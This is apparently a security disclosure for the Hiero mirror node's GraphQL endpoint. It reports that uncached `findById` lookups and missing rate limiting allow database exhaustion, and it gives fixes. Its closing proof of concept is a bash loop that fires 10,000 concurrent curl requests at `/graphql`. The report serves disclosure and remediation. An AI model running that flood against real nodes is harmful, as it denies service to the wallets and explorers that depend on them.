### Title
Unauthenticated GraphQL Endpoint Lacks Rate Limiting, Enabling DB Exhaustion via `getByIdAndType()`

### Summary
The GraphQL module exposes `getByIdAndType()` in `EntityServiceImpl` without any request rate limiting. Each call directly executes an uncached `entityRepository.findById()` database query. An unprivileged attacker can flood the endpoint with unique entity IDs, saturating the database connection pool and preventing the mirror node from processing new data.

### Finding Description
**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 24–26:
```java
public Optional<Entity> getByIdAndType(EntityId entityId, EntityType type) {
    return entityRepository.findById(entityId.getId()).filter(e -> e.getType() == type);
}
```

Called from `AccountController.java` line 43 on every `account(input: {entityId: ...})` GraphQL query.

**Root cause — two compounding gaps:**

1. **No caching on `findById`**: The GraphQL-module `EntityRepository` (`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`) extends bare `CrudRepository<Entity, Long>` with **no `@Cacheable` annotation** on `findById`. Contrast with the grpc module's `EntityRepository` (line 14) which carries `@Cacheable(cacheNames = CACHE_NAME, cacheManager = ENTITY_CACHE, ...)`. Every call to `getByIdAndType()` unconditionally hits the database.

2. **No rate limiting in the GraphQL module**: The `web3` module has a full `ThrottleConfiguration` (bucket4j, `rateLimitBucket`, `gasLimitBucket`) and `ThrottleManagerImpl`. The `graphql` module has **none of this**. Searching for `SecurityConfig`, `RateLimiter`, `ThrottleFilter`, or `bucket4j` in `graphql/**` returns zero matches.

**Why existing checks are insufficient:**

`GraphQlConfiguration.java` (lines 43–48) installs only:
- `MaxQueryComplexityInstrumentation(200)` — limits complexity of a *single* query, not request rate
- `MaxQueryDepthInstrumentation(10)` — limits nesting depth, not request rate
- JSON/parser token limits (lines 34, 74–81) — prevent oversized payloads, not high request volume

`CachedPreparsedDocumentProvider` caches the *parsed query document*, not query results — the DB query still executes on every request.

**Exploit flow:**
An attacker sends a high-volume stream of POST requests to `/graphql`, each with a structurally valid, low-complexity query using a distinct `entityId.num`:
```graphql
query { account(input: { entityId: {shard:0, realm:0, num: <N>} }) { id } }
```
Each request passes all structural checks (complexity=1, depth=2), reaches `getByIdAndType()`, and issues `SELECT * FROM entity WHERE id = <N>`. With unique IDs, no cache can absorb the load.

### Impact Explanation
The mirror node's PostgreSQL database is shared between the GraphQL service and the importer. Saturating the DB connection pool or CPU prevents the importer from writing newly ingested Hedera transactions, making the mirror node unable to reflect current network state. Downstream consumers (wallets, explorers, dApps) relying on the mirror node lose access to current transaction data. The severity is high for mirror node availability; it does not directly shut down Hedera consensus nodes, but it constitutes a full mirror node DoS.

### Likelihood Explanation
No authentication or API key is required to reach the GraphQL endpoint. The attack requires only an HTTP client and a loop counter. The query is minimal (under 100 bytes), so bandwidth is not a bottleneck. A single machine with a modest connection pool can sustain tens of thousands of requests per minute. The attack is trivially repeatable and scriptable with zero specialized knowledge.

### Recommendation
1. **Add request-rate limiting to the GraphQL module** using the same bucket4j pattern already present in `web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java`. Implement a servlet filter or `WebGraphQlInterceptor` that consumes from a rate-limit bucket per IP (or globally) before query execution.
2. **Add `@Cacheable` to `findById` in the GraphQL `EntityRepository`**, mirroring the grpc module's pattern, so repeated lookups of the same entity ID are served from cache rather than the database.
3. Consider enforcing rate limits at the load balancer/ingress layer as an additional defense-in-depth measure (this is already noted as a recommendation in `docs/design/contract-log-subscription.md` line 37 for GraphQL subscriptions, but not implemented for queries).

### Proof of Concept
```bash
# Requires: curl, bash
# Sends 10,000 requests with unique entity IDs to the GraphQL endpoint
for i in $(seq 1 10000); do
  curl -s -X POST http://<mirror-node-host>/graphql \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ account(input:{entityId:{shard:0,realm:0,num:$i}}){id} }\"}" &
done
wait
# Each request bypasses all existing checks (complexity=1, depth=2, payload<100 bytes)
# and triggers entityRepository.findById($i) — a direct DB SELECT with no cache.
# Monitor DB connection saturation via pg_stat_activity or mirror node metrics.
```
